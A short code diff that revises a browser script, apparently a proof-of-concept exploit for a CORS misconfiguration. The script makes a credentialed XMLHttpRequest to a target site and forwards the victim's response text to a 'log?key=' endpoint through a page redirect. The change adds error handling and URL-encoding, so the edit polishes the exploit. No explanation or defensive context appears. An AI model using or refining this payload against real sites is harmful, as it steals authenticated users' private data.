@@ -1,11 +1,15 @@
 <script>
-   var req = new XMLHttpRequest();
-   req.onload = reqListener;
-   req.open('get','https://www.jaguar.here.com/#search/0',true);
-   req.withCredentials = true;
-   req.send();
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;  
+    req.onerror = function() {
+        console.error('Request failed');
+    };
+    req.open('GET', 'https://www.jaguar.here.com/#search/0', true);  
+    req.withCredentials = true;  
+    req.send();  
 
-   function reqListener() {
-       location='log?key='+this.responseText;
-   };
+    function reqListener() {
+        var response = encodeURIComponent(this.responseText);
+        location = 'log?key=' + response;  
+    }
 </script>
